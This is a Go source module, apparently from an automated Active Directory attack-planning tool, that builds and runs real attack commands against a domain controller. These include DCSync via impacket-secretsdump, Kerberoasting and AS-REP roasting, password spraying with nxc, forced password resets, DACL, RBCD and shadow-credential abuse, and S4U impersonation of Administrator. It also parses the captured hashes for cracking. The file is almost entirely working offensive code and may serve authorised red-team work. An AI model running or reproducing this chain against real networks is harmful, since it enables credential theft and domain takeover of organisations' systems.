package modules

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"adpack/core"
)

// HashCred represents a captured hash credential with its type for hashcat.
type HashCred struct {
	HashType string `json:"hash_type"`
	Hash     string `json:"hash"`
	Username string `json:"username,omitempty"`
	Domain   string `json:"domain,omitempty"`
}

var krb5tgsRe = regexp.MustCompile(`(?m)\$krb5tgs\$23\$[*].*$`)
var krb5asrepRe = regexp.MustCompile(`(?m)\$krb5asrep\$23\$[*].*$`)

// ParseKerberoastOutput extracts $krb5tgs$23$ hashes from impacket-GetUserSPNs stdout.
func ParseKerberoastOutput(stdout string) []HashCred {
	matches := krb5tgsRe.FindAllString(stdout, -1)
	seen := make(map[string]bool)
	var out []HashCred
	for _, m := range matches {
		if seen[m] {
			continue
		}
		seen[m] = true
		out = append(out, HashCred{HashType: "krb5tgs", Hash: m})
	}
	return out
}

// ParseASREPOutput extracts $krb5asrep$23$ hashes from impacket-GetNPUsers stdout.
func ParseASREPOutput(stdout string) []HashCred {
	matches := krb5asrepRe.FindAllString(stdout, -1)
	seen := make(map[string]bool)
	var out []HashCred
	for _, m := range matches {
		// Extract the hash value (everything after the last $)
		hashVal := m
		if idx := strings.LastIndex(m, "$"); idx >= 0 {
			hashVal = m[idx+1:]
		}
		if seen[hashVal] {
			continue
		}
		seen[hashVal] = true
		out = append(out, HashCred{HashType: "krb5asrep", Hash: m})
	}
	return out
}

// ParseNTLMOutput extracts NTLM hashes from impacket-secretsdump stdout.
func ParseNTLMOutput(stdout string) []HashCred {
	lines := strings.Split(stdout, "\n")
	seen := make(map[string]bool)
	var out []HashCred
	for _, line := range lines {
		if !strings.Contains(line, ":::") {
			continue
		}
		parts := strings.SplitN(line, ":", 4)
		if len(parts) < 4 {
			continue
		}
		username := parts[0]
		nthash := parts[3]
		if idx := strings.Index(nthash, ":"); idx >= 0 {
			nthash = nthash[:idx]
		}
		// Skip NTLMSTUB and empty password hash
		if nthash == "aad3b435b51404eeaad3b435b51404ee" || nthash == "31d6cfe0d16ae931b73c59d7e0c089c0" {
			continue
		}
		if seen[nthash] {
			continue
		}
		seen[nthash] = true
		out = append(out, HashCred{HashType: "ntlm", Hash: nthash, Username: username})
	}
	return out
}

// DispatchResult wraps the output of a real tool execution alongside the
// executor's predicted delta, ready for reconciliation.
type DispatchResult struct {
	ToolOutput string
	ExitCode   int
	Predicted  core.ExecutionResult
	Capability core.Capability
	Edge       core.PrivilegeEdge
	Hashes     []HashCred
}

// ExecuteAndReconcile runs the real tool for a given capability on an edge,
// reconciles the output against the executor's predicted delta, then
// runs a post-action LDAP state verification.
//
// Heuristic failure (tool crash, wrong output) blocks the mutation.
// State-verification failure is treated as a CONFIDENCE SIGNAL, not a block
// — the delta is still applied but edges carry degraded confidence so the
// planner naturally deprioritises them.
//
// The caller should always ApplyDelta — the verdict tells you at what
// confidence the edges should be materialised.
func ExecuteAndReconcile(ctx context.Context, edge core.PrivilegeEdge, cap core.Capability, state *core.ADState, domain, user, pass, hash, targetIP string) (ReconVerdict, error) {
	// Dispatch guard: all executor invocation goes through the capability registry.
	// This ensures planner state tracking is never bypassed.
	reg := CapabilityRegistry
	if reg == nil {
		return ReconVerdict{Trustworthy: false, Summary: "no capability registry"}, fmt.Errorf("capability registry not configured")
	}

	exec, status := reg.Resolve(cap)
	if status != core.CapabilityAvailable {
		return ReconVerdict{Trustworthy: false, Summary: fmt.Sprintf("capability %s not available", cap)},
			fmt.Errorf("capability %s not available (status %d)", cap, status)
	}

	predicted := exec.Execute(ctx, edge, state)

	dr, err := dispatchTool(ctx, edge, cap, domain, user, pass, hash, targetIP)
	if err != nil {
		return ReconVerdict{Trustworthy: false, Summary: err.Error()}, err
	}

	// Phase 1: Heuristic output-based reconciliation (hard gate)
	heuristic := ReconcileCrossCheck(predicted, cap, dr.ToolOutput, dr.ExitCode)
	if !heuristic.Trustworthy {
		return heuristic, nil
	}

	// Phase 2: State-grounded LDAP verification (confidence signal)
	stateResult := VerifyState(ctx, edge, cap, domain, user, pass, targetIP)
	if !stateResult.Passed {
		// Degrade confidence on all predicted edges rather than blocking
		for i := range predicted.Delta.NewEdges {
			predicted.Delta.NewEdges[i].DegradeConfidence(stateResult.Confidence, "state_verification")
		}
		for i := range predicted.Delta.RemovedEdges {
			_ = i
		}
		return ReconVerdict{
			Trustworthy: true,
			Confidence:  stateResult.Confidence,
			Summary:     fmt.Sprintf("state verify failed — edges degraded (conf=%.2f): %s", stateResult.Confidence, stateResult.Evidence),
			Mismatches: []ReconMismatch{{
				Field: "state_ground", Expected: "confirmed", Actual: stateResult.Evidence,
			}},
		}, nil
	}

	// Mark predicted edges as state-verified
	for i := range predicted.Delta.NewEdges {
		predicted.Delta.NewEdges[i].MarkVerified(stateResult.Confidence, stateResult.Evidence)
	}

	return ReconVerdict{
		Trustworthy: true,
		Confidence:  stateResult.Confidence,
		Summary:     fmt.Sprintf("reconciled + state-grounded: %s", stateResult.Evidence),
	}, nil
}

// dispatchTool runs the real command-line tool for the given capability.
func dispatchTool(ctx context.Context, edge core.PrivilegeEdge, cap core.Capability, domain, user, pass, hash, targetIP string) (DispatchResult, error) {
	fmt.Printf("[dispatch] capability=%s edge=%s→%s\n", cap, edge.SourcePrincipal, edge.TargetPrincipal)
	dCtx, cancel := context.WithTimeout(ctx, 120*time.Second)
	defer cancel()

	cmd, err := buildCommand(dCtx, edge, cap, domain, user, pass, hash, targetIP)
	if err != nil {
		return DispatchResult{}, err
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	exitCode := 0

	err = cmd.Run()
	select {
	case <-dCtx.Done():
		return DispatchResult{}, dCtx.Err()
	default:
	}

	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			return DispatchResult{}, fmt.Errorf("tool execution failed: %w", err)
		}
	}

	output := stdout.String()
	if stderr.Len() > 0 {
		if output != "" {
			output += "\n" + stderr.String()
		} else {
			output = stderr.String()
		}
	}

	// Resolve the executor to get predicted delta
	reg := CapabilityRegistry
	var predicted core.ExecutionResult
	if reg != nil {
		if exec, status := reg.Resolve(cap); status == core.CapabilityAvailable {
			predicted = exec.Execute(ctx, edge, &core.ADState{})
		}
	}

	// Parse hashes from output based on capability
	var hashes []HashCred
	capLower := strings.ToLower(string(cap))
	switch {
	case strings.Contains(capLower, "kerberoast"):
		hashes = ParseKerberoastOutput(output)
	case strings.Contains(capLower, "asrep_roast"):
		hashes = ParseASREPOutput(output)
	case strings.Contains(capLower, "dcsync") || strings.Contains(capLower, "unconstrained"):
		hashes = ParseNTLMOutput(output)
	}

	return DispatchResult{
		ToolOutput: output,
		ExitCode:   exitCode,
		Predicted:  predicted,
		Capability: cap,
		Edge:       edge,
		Hashes:     hashes,
	}, nil
}

// buildCommand constructs the exec.Cmd for a capability + edge with context
// for timeout enforcement.
func buildCommand(ctx context.Context, edge core.PrivilegeEdge, cap core.Capability, domain, user, pass, hash, targetIP string) (*exec.Cmd, error) {
	source := edge.SourcePrincipal
	if idx := strings.Index(source, "\\"); idx >= 0 {
		source = source[idx+1:]
	}
	target := edge.TargetPrincipal
	if idx := strings.Index(target, "\\"); idx >= 0 {
		target = target[idx+1:]
	}

	capLower := strings.ToLower(string(cap))

	switch {
	case strings.Contains(capLower, "add_member"):
		// bloodyAD add groupMember <group> <user>
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"add", "groupMember", target, source,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil

	case strings.Contains(capLower, "force_change_password"):
		newPass := "P@ssw0rd_Changed_2026!"
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"set", "password", target, newPass,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil

	case strings.Contains(capLower, "write_dacl"):
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"add", "genericAll", target, source,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil

	case strings.Contains(capLower, "generic_all"):
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"add", "genericAll", target, source,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil

	case strings.Contains(capLower, "dcsync"):
		// impacket-secretsdump domain/user:pass@target
		targetStr := fmt.Sprintf("%s/%s:%s@%s", domain, user, pass, targetIP)
		args := []string{targetStr}
		return exec.CommandContext(ctx, "impacket-secretsdump", args...), nil

	case strings.Contains(capLower, "cert_auth"):
		// certipy req -u user@domain -p pass -ca CA-SERVER -template User
		// certipy finds CA servers automatically; provide explicit target IP
		args := []string{
			"req", "-u", fmt.Sprintf("%s@%s", user, domain),
			"-p", pass, "-dc-ip", targetIP,
			"-template", "User",
		}
		return exec.CommandContext(ctx, "certipy", args...), nil

	case strings.Contains(capLower, "rbcd"):
		// bloodyAD add rbcd <computer> <source_principal>
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"add", "rbcd", target, source,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil

	case strings.Contains(capLower, "shadow_cred"):
		// pywhisker -d domain -u user -p pass --target target_sam --action add
		args := []string{
			"-d", domain, "-u", fmt.Sprintf("%s\\%s", domain, user),
			"-p", pass, "--target", target,
			"--action", "add",
		}
		return exec.CommandContext(ctx, "pywhisker", args...), nil

	case strings.Contains(capLower, "kerberoast"):
		// impacket-GetUserSPNs domain/user:pass -request
		args := []string{
			fmt.Sprintf("%s/%s:%s", domain, user, pass),
			"-request",
		}
		return exec.CommandContext(ctx, "impacket-GetUserSPNs", args...), nil

	case strings.Contains(capLower, "asrep_roast"):
		// impacket-GetNPUsers domain/ -no-pass -usersfile users.txt
		args := []string{
			fmt.Sprintf("%s/", domain),
			"-no-pass",
			"-usersfile", fmt.Sprintf("%s.txt", target),
		}
		return exec.CommandContext(ctx, "impacket-GetNPUsers", args...), nil

	case strings.Contains(capLower, "ldap_spray"):
		// nxc ldap target -d domain -u user -p pass --spray
		args := []string{
			targetIP, "-d", domain, "-u", user,
			"-p", pass, "--spray",
		}
		return exec.CommandContext(ctx, "nxc", append([]string{"ldap"}, args...)...), nil

	case strings.Contains(capLower, "unconstrained_delegation"):
		// Exploitation chain assumes the runtime supervisor has already
		// captured a forwarded TGT via the coercer + ntlmrelay/responder
		// pipeline. With KRB5CCNAME pointing at that ccache, secretsdump
		// can DCSync as the impersonated user against the DC.
		//
		// Operators who haven't captured a TGT yet will see the command
		// fail at reconciliation (missing "krbtgt" indicator) → edge is
		// degraded rather than blocking the planner.
		targetStr := fmt.Sprintf("%s/%s@%s", domain, user, targetIP)
		args := []string{"-k", "-no-pass", targetStr}
		return exec.CommandContext(ctx, "impacket-secretsdump", args...), nil

	case strings.Contains(capLower, "s4u_delegation"):
		// S4U2Self+S4U2Proxy via impacket-getST. Use the source as the
		// authenticating principal and target the CIFS SPN on the
		// privilege target. -impersonate Administrator yields the
		// canonical SYSTEM-level ticket.
		auth := buildImpacketAuth(domain, user, pass, hash, targetIP)
		args := []string{
			"-spn", "cifs/" + edge.TargetPrincipal,
			"-impersonate", "Administrator",
			"-dc-ip", targetIP,
			auth,
		}
		if hash != "" && pass == "" {
			args = append([]string{"-hashes", ":" + hash}, args...)
		}
		return exec.CommandContext(ctx, "impacket-getST", args...), nil

	default:
		return nil, fmt.Errorf("no tool dispatch for capability %s", cap)
	}
}
